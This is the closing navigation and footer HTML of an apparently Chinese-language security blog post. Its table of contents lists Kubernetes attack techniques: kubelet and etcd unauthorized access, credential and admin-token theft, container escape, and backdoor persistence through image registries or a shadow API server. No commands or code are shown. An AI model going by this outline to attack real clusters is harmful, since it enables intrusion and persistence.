href="#kubelet-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">4.1.8.</span> <span class="toc-text">kubelet 未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8CPod%E5%86%85%E5%91%BD%E4%BB%A4"><span class="toc-number">4.1.8.1.</span> <span class="toc-text">执行Pod内命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AE%B9%E5%99%A8%E5%86%85service-account%E5%87%AD%E6%8D%AE"><span class="toc-number">4.1.8.2.</span> <span class="toc-text">获取容器内service account凭据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#etcd-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">4.1.9.</span> <span class="toc-text">etcd 未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%AE%A1%E7%90%86%E5%91%98token"><span class="toc-number">4.1.9.1.</span> <span class="toc-text">查询管理员token</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C"><span class="toc-number">4.2.</span> <span class="toc-text">执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%8C%82%E8%BD%BD%E9%80%83%E9%80%B8"><span class="toc-number">4.2.1.</span> <span class="toc-text">*目录挂载逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Service-Account%E8%BF%9E%E6%8E%A5API-Server%E6%89%A7%E8%A1%8C%E6%8C%87%E4%BB%A4"><span class="toc-number">4.2.2.</span> <span class="toc-text">利用Service Account连接API Server执行指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">4.3.</span> <span class="toc-text">持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8%E7%A7%81%E6%9C%89%E9%95%9C%E5%83%8F%E5%BA%93%E4%B8%AD%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8%EF%BC%88Pod%E6%8C%81%E4%B9%85%E5%8C%96%EF%BC%89"><span class="toc-number">4.3.0.1.</span> <span class="toc-text">在私有镜像库中植入后门（Pod持久化）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%EF%BC%88%E9%9B%86%E7%BE%A4%E6%8C%81%E4%B9%85%E5%8C%96%EF%BC%89"><span class="toc-number">4.3.0.2.</span> <span class="toc-text">修改核心组件访问权限（集群持久化）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shadow-api-server%EF%BC%88%E9%9B%86%E7%BE%A4%E6%8C%81%E4%B9%85%E5%8C%96-cdk%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%EF%BC%89"><span class="toc-number">4.3.0.3.</span> <span class="toc-text">shadow api server（集群持久化&#x2F;cdk工具利用）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.4.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.5.</span> <span class="toc-text">探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%AF%E5%90%A6%E5%9C%A8%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E4%B8%AD"><span class="toc-number">4.5.1.</span> <span class="toc-text">是否在容器环境中</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-ref"><span class="toc-number">5.</span> <span class="toc-text">#0x04 ref</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: #0D0101"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By ConsT27</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">怀念那一刹耀眼的火花</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>